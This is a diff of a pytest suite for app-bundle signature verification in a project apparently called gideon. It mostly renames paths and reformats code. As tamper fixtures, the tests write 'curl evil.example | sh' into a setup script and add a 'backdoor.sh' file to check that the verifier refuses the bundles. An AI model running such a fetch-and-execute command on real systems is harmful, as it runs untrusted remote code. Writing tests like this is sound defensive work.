@@ -7,7 +7,7 @@ Four things are asserted here, in order of how badly getting them wrong would hu
    while the live app dir did not yet exist — a signature check that ran after an
    unpack is decoration.
 2. **The signature covers the PAYLOAD, not just the manifest.** ``TestSwapTheUnsignedHalf``
-   is the atom's load-bearing test: sign a bundle, then swap ``scripts/setup.sh`` (or add
+   is the atom's load-bearing test: sign a bundle, then swap ``tooling/scripts/setup.sh`` (or add
    a file the digest manifest never listed, or delete one) and require a refusal. If only
    ``app.json`` were signed, the first case would install.
 3. **Every failure fails closed.** ``TestFailsClosed`` walks missing halves, truncation,
@@ -32,18 +32,18 @@ from pathlib import Path
 
 import pytest
 
-from gideon import signing
-from gideon.apps import app_manager
-from gideon.signing import (
+from gideon.extensions.apps import app_manager
+from gideon.security import signing
+from gideon.security.signing import (
     MANIFEST_FILENAME,
     SIGNATURE_FILENAME,
     SignatureState,
     build_digest_manifest,
     verify_bundle,
 )
-from gideon.supply_chain import TrustTier, Verdict
+from gideon.security.supply_chain import TrustTier, Verdict
 
-REPO_ROOT = Path(__file__).resolve().parents[2]
+REPO_ROOT = Path(__file__).resolve().parents[3]
 
 pytest.importorskip(
     "cryptography",
@@ -52,11 +52,11 @@ pytest.importorskip(
 
 
 def _load_sign_app():
-    """Import ``scripts/sign_app.py`` — the maintainer signer — so these tests exercise
+    """Import ``tooling/scripts/sign_app.py`` — the maintainer signer — so these tests exercise
     the SHIPPED signing implementation rather than a parallel one written for tests.
     A second, test-only signer would happily agree with a broken verifier."""
     spec = importlib.util.spec_from_file_location(
-        "sh3_sign_app", REPO_ROOT / "scripts" / "sign_app.py"
+        "sh3_sign_app", REPO_ROOT / "tooling/scripts" / "sign_app.py"
     )
     assert spec and spec.loader
     module = importlib.util.module_from_spec(spec)
@@ -67,14 +67,11 @@ def _load_sign_app():
 sign_app = _load_sign_app()
 
 
-# ── fixtures ────────────────────────────────────────────────────────────────────
-
-
 @pytest.fixture
 def bundle(tmp_path: Path) -> Path:
     """A minimal, scan-clean app bundle."""
     root = tmp_path / "src" / "demo-app"
-    (root / "scripts").mkdir(parents=True)
+    (root / "tooling/scripts").mkdir(parents=True)
     (root / "app.json").write_text(
         json.dumps(
             {
@@ -86,7 +83,7 @@ def bundle(tmp_path: Path) -> Path:
         ),
         encoding="utf-8",
     )
-    (root / "scripts" / "setup.sh").write_text("echo hello\n", encoding="utf-8")
+    (root / "tooling/scripts" / "setup.sh").write_text("echo hello\n", encoding="utf-8")
     (root / "README.md").write_text("demo\n", encoding="utf-8")
     return root
 
@@ -111,9 +108,6 @@ def _sign(bundle: Path, seed: Path) -> None:
     sign_app.sign_bundle(bundle, seed)
 
 
-# ── the digest manifest ─────────────────────────────────────────────────────────
-
-
 class TestDigestManifest:
     def test_covers_every_file_and_is_deterministic(self, bundle: Path) -> None:
         blob = build_digest_manifest(bundle)
@@ -121,26 +115,25 @@ class TestDigestManifest:
         lines = blob.decode().splitlines()
         assert lines[0] == signing.MANIFEST_HEADER
         covered = {ln.split("  ", 1)[1] for ln in lines[1:]}
-        assert covered == {"app.json", "scripts/setup.sh", "README.md"}
-        # the digests are real, not placeholders
+        assert covered == {"app.json", "tooling/scripts/setup.sh", "README.md"}
         expected = hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
         assert f"{expected}  app.json" in lines
 
-    def test_excludes_only_the_two_signature_files(self, bundle: Path, keys: Path) -> None:
+    def test_excludes_only_the_two_signature_files(
+        self, bundle: Path, keys: Path
+    ) -> None:
         _sign(bundle, keys)
         covered = {
-            ln.split("  ", 1)[1] for ln in build_digest_manifest(bundle).decode().splitlines()[1:]
+            ln.split("  ", 1)[1]
+            for ln in build_digest_manifest(bundle).decode().splitlines()[1:]
         }
         assert MANIFEST_FILENAME not in covered and SIGNATURE_FILENAME not in covered
-        assert covered == {"app.json", "scripts/setup.sh", "README.md"}
+        assert covered == {"app.json", "tooling/scripts/setup.sh", "README.md"}
 
     def test_symlink_cannot_be_signed(self, bundle: Path) -> None:
-        (bundle / "link.sh").symlink_to(bundle / "scripts" / "setup.sh")
+        (bundle / "link.sh").symlink_to(bundle / "tooling/scripts" / "setup.sh")
         with pytest.raises(signing.ManifestError, match="symlink"):
             build_digest_manifest(bundle)
-
-
-# ── round trip ──────────────────────────────────────────────────────────────────
 
 
 class TestRoundTrip:
@@ -165,32 +158,35 @@ class TestRoundTrip:
 
     def test_no_private_key_material_is_committed(self) -> None:
         """The trust store ships public halves only — the rule this atom must not break."""
-        store = REPO_ROOT / "src" / "gideon" / "trusted_keys"
+        store = REPO_ROOT / "runtime" / "gideon" / "security" / "trusted_keys"
         assert store.is_dir()
         stray = [p.name for p in store.iterdir() if p.suffix not in (".pub", ".md")]
         assert not stray, f"non-public files in the trust store: {stray}"
-
-
-# ── THE swap test ───────────────────────────────────────────────────────────────
 
 
 class TestSwapTheUnsignedHalf:
     """Sign, then change something the naive design would leave unsigned.
 
     Each case must be REFUSED. The manifest-only variant is the one that matters: a
-    signature over ``app.json`` alone verifies fine while ``scripts/setup.sh`` — the file
+    signature over ``app.json`` alone verifies fine while ``tooling/scripts/setup.sh`` — the file
     that actually executes — is attacker-controlled."""
 
-    def test_swapping_the_payload_after_signing_is_refused(self, bundle: Path, keys: Path) -> None:
+    def test_swapping_the_payload_after_signing_is_refused(
+        self, bundle: Path, keys: Path
+    ) -> None:
         _sign(bundle, keys)
         assert verify_bundle(bundle).state is SignatureState.SIGNED
-        (bundle / "scripts" / "setup.sh").write_text("curl evil.example | sh\n", encoding="utf-8")
+        (bundle / "tooling/scripts" / "setup.sh").write_text(
+            "curl evil.example | sh\n", encoding="utf-8"
+        )
         info = verify_bundle(bundle)
         assert info.state is SignatureState.INVALID
-        assert "scripts/setup.sh" in info.reason
+        assert "tooling/scripts/setup.sh" in info.reason
         assert "modified after signing" in info.reason
 
-    def test_swapping_the_manifest_after_signing_is_refused(self, bundle: Path, keys: Path) -> None:
+    def test_swapping_the_manifest_after_signing_is_refused(
+        self, bundle: Path, keys: Path
+    ) -> None:
         _sign(bundle, keys)
         manifest = json.loads((bundle / "app.json").read_text(encoding="utf-8"))
         manifest["displayName"] = "Definitely The Real App"
@@ -202,11 +198,13 @@ class TestSwapTheUnsignedHalf:
     def test_adding_an_unlisted_file_is_refused(self, bundle: Path, keys: Path) -> None:
         """A digest LIST alone would miss this: every listed digest still matches."""
         _sign(bundle, keys)
-        (bundle / "scripts" / "backdoor.sh").write_text("echo pwned\n", encoding="utf-8")
+        (bundle / "tooling/scripts" / "backdoor.sh").write_text(
+            "echo pwned\n", encoding="utf-8"
+        )
         info = verify_bundle(bundle)
         assert info.state is SignatureState.INVALID
         assert "not covered by the signature" in info.reason
-        assert "scripts/backdoor.sh" in info.reason
+        assert "tooling/scripts/backdoor.sh" in info.reason
 
     def test_removing_a_signed_file_is_refused(self, bundle: Path, keys: Path) -> None:
         _sign(bundle, keys)
@@ -225,16 +223,18 @@ class TestSwapTheUnsignedHalf:
         The weak verifier is built here, in-process — the shipped one is untouched."""
         _sign(bundle, keys)
         signed_app_json = hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
-        (bundle / "scripts" / "setup.sh").write_text("curl evil.example | sh\n", encoding="utf-8")
+        (bundle / "tooling/scripts" / "setup.sh").write_text(
+            "curl evil.example | sh\n", encoding="utf-8"
+        )
 
-        weak_ok = signed_app_json == hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
+        weak_ok = (
+            signed_app_json
+            == hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
+        )
         assert weak_ok, "the manifest-only check should be fooled — that is the hole"
         assert (
             verify_bundle(bundle).state is SignatureState.INVALID
         ), "the shipped verifier accepted the swap the weak one accepts"
-
-
-# ── fail-closed matrix ──────────────────────────────────────────────────────────
 
 
 class TestFailsClosed:
@@ -259,15 +259,29 @@ class TestFailsClosed:
             (lambda t: "", "malformed"),
             (lambda t: "untrusted comment: x\n", "malformed"),
             (lambda t: t.replace(t.splitlines()[1], "!!!not base64!!!"), "malformed"),
-            (lambda t: t.replace(t.splitlines()[1], t.splitlines()[1][:20]), "malformed"),
+            (
+                lambda t: t.replace(t.splitlines()[1], t.splitlines()[1][:20]),
+                "malformed",
+            ),
             (
                 lambda t: "\n".join(
-                    [t.splitlines()[0], t.splitlines()[1], "comment: nope", t.splitlines()[3]]
+                    [
+                        t.splitlines()[0],
+                        t.splitlines()[1],
+                        "comment: nope",
+                        t.splitlines()[3],
+                    ]
                 ),
                 "malformed",
             ),
         ],
-        ids=["empty", "truncated-file", "bad-base64", "short-block", "no-trusted-comment"],
+        ids=[
+            "empty",
+            "truncated-file",
+            "bad-base64",
+            "short-block",
+            "no-trusted-comment",
+        ],
     )
     def test_malformed_signature_never_reads_as_valid(
         self, bundle: Path, keys: Path, mutate, expect: str
@@ -279,7 +293,9 @@ class TestFailsClosed:
         assert info.state is SignatureState.INVALID
         assert expect in info.reason
 
-    def test_unknown_key_is_refused(self, bundle: Path, keys: Path, tmp_path: Path) -> None:
+    def test_unknown_key_is_refused(
+        self, bundle: Path, keys: Path, tmp_path: Path
+    ) -> None:
         """A valid signature from a key that is not in the in-tree store."""
         other = tmp_path / "other-keys"
         _, other_seed = sign_app.gen_key("Attacker", other)
@@ -307,7 +323,9 @@ class TestFailsClosed:
         assert info.state is SignatureState.INVALID
         assert "does not verify" in info.reason
 
-    def test_tampered_trusted_comment_is_refused(self, bundle: Path, keys: Path) -> None:
+    def test_tampered_trusted_comment_is_refused(
+        self, bundle: Path, keys: Path
+    ) -> None:
         _sign(bundle, keys)
         sig = bundle / SIGNATURE_FILENAME
         lines = sig.read_text(encoding="utf-8").splitlines()
@@ -327,9 +345,13 @@ class TestFailsClosed:
         assert info.state is SignatureState.INVALID
         assert "no Ed25519 backend" in info.reason
 
-    def test_corrupt_key_file_does_not_disable_the_store(self, bundle: Path, keys: Path) -> None:
+    def test_corrupt_key_file_does_not_disable_the_store(
+        self, bundle: Path, keys: Path
+    ) -> None:
         """A garbage ``.pub`` sitting beside a good one must not shut verification off."""
-        (signing.trusted_keys_dir() / "Broken.pub").write_text("untrusted comment: x\n%%%\n")
+        (signing.trusted_keys_dir() / "Broken.pub").write_text(
+            "untrusted comment: x\n%%%\n"
+        )
         _sign(bundle, keys)
         assert verify_bundle(bundle).state is SignatureState.SIGNED
 
@@ -348,14 +370,11 @@ class TestFailsClosed:
         assert verify_bundle(bundle).state is SignatureState.UNSIGNED
 
 
-# ── the install chokepoint ──────────────────────────────────────────────────────
-
-
 @pytest.fixture
 def app_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
     """Isolate the app tree — no test here may touch the real ``~/.gideon``."""
-    import gideon.config.loader as loader
-    from gideon.apps import manager
+    import gideon.core.config.loader as loader
+    from gideon.extensions.apps import manager
 
     home = tmp_path / "home"
     home.mkdir()
@@ -417,15 +436,20 @@ class TestVerifyRunsBeforeInstall:
         manifest["setup"] = {"onInstall": f"touch {marker}"}
         (bundle / "app.json").write_text(json.dumps(manifest), encoding="utf-8")
         _sign(bundle, keys)
-        # ...and now swap the payload the signature covered.
-        (bundle / "scripts" / "setup.sh").write_text("echo swapped\n", encoding="utf-8")
+        (bundle / "tooling/scripts" / "setup.sh").write_text(
+            "echo swapped\n", encoding="utf-8"
+        )
 
         res = app_manager.install(bundle, origin="local", confirm=True)
         assert res.ok is False
         assert "invalid signature" in (res.error or "")
-        assert not marker.exists(), "the install hook ran on a bundle with a bad signature"
+        assert (
+            not marker.exists()
+        ), "the install hook ran on a bundle with a bad signature"
         assert not app_manager.app_dir("demo-app").exists()
-        assert trace["order"] == ["verify"], "the scan ran after a terminal signature refusal"
+        assert trace["order"] == [
+            "verify"
+        ], "the scan ran after a terminal signature refusal"
 
     def test_confirm_does_not_override_an_invalid_signature(
         self, bundle: Path, keys: Path, app_home: Path
@@ -436,7 +460,9 @@ class TestVerifyRunsBeforeInstall:
         for confirm in (False, True):
             res = app_manager.install(bundle, origin="local", confirm=confirm)
             assert res.ok is False
-            assert res.needs_consent is False, "a tampered bundle was offered as consentable"
+            assert (
+                res.needs_consent is False
+            ), "a tampered bundle was offered as consentable"
             assert res.scan is not None
             assert res.scan.signature.state is SignatureState.INVALID
             assert res.scan.signature.reason
@@ -449,12 +475,16 @@ class TestVerifyRunsBeforeInstall:
         _sign(bundle, keys)
         assert app_manager.install(bundle, origin="local").ok
 
-        (bundle / "scripts" / "setup.sh").write_text("echo tampered\n", encoding="utf-8")
+        (bundle / "tooling/scripts" / "setup.sh").write_text(
+            "echo tampered\n", encoding="utf-8"
+        )
         res = app_manager.update(bundle, name="demo-app", origin="local", confirm=True)
         assert res.ok is False
         assert "invalid signature" in (res.error or "")
-        live = app_manager.app_dir("demo-app") / "scripts" / "setup.sh"
-        assert live.read_text(encoding="utf-8") == "echo hello\n", "the tampered update landed"
+        live = app_manager.app_dir("demo-app") / "tooling/scripts" / "setup.sh"
+        assert (
+            live.read_text(encoding="utf-8") == "echo hello\n"
+        ), "the tampered update landed"
 
     def test_the_installed_bytes_are_the_signed_bytes(
         self, bundle: Path, keys: Path, app_home: Path
@@ -467,11 +497,13 @@ class TestVerifyRunsBeforeInstall:
         live = app_manager.app_dir("demo-app")
         installed = {
             rel: hashlib.sha256((live / rel).read_bytes()).hexdigest()
-            for rel in ("app.json", "scripts/setup.sh", "README.md")
+            for rel in ("app.json", "tooling/scripts/setup.sh", "README.md")
         }
         for line in signed_manifest.decode().splitlines()[1:]:
             digest, _, rel = line.partition("  ")
-            assert installed[rel] == digest, f"{rel} differs from the bytes that were signed"
+            assert (
+                installed[rel] == digest
+            ), f"{rel} differs from the bytes that were signed"
 
 
 class TestUnsignedStaysInstallable:
@@ -502,7 +534,9 @@ class TestUnsignedStaysInstallable:
         assert info.state is SignatureState.SIGNED
         assert tier is TrustTier.BUILTIN, "signing downgraded a builtin app's tier"
 
-    def test_an_unsigned_bundle_keeps_its_origins_tier(self, bundle: Path, keys: Path) -> None:
+    def test_an_unsigned_bundle_keeps_its_origins_tier(
+        self, bundle: Path, keys: Path
+    ) -> None:
         for origin, expected in (
             ("local", TrustTier.COMMUNITY),
             ("registry", TrustTier.OFFICIAL),
@@ -516,8 +550,10 @@ class TestUnsignedStaysInstallable:
 class TestConsentPayload:
     """C2's wire shape — what the consent UI reads."""
 
-    def test_scan_report_serializes_state_signer_and_reason(self, bundle: Path, keys: Path) -> None:
-        from gideon.supply_chain import ScanReport
+    def test_scan_report_serializes_state_signer_and_reason(
+        self, bundle: Path, keys: Path
+    ) -> None:
+        from gideon.security.supply_chain import ScanReport
 
         _sign(bundle, keys)
         report = ScanReport(signature=verify_bundle(bundle))
@@ -532,7 +568,7 @@ class TestConsentPayload:
     def test_a_report_that_never_looked_says_unsigned_not_signed(self) -> None:
         """The default must be the honest one — a path that never verified must not be
         able to render "signed by Gideon"."""
-        from gideon.supply_chain import ScanReport
+        from gideon.security.supply_chain import ScanReport
 
         assert ScanReport().to_dict()["signature"] == {
             "state": "unsigned",
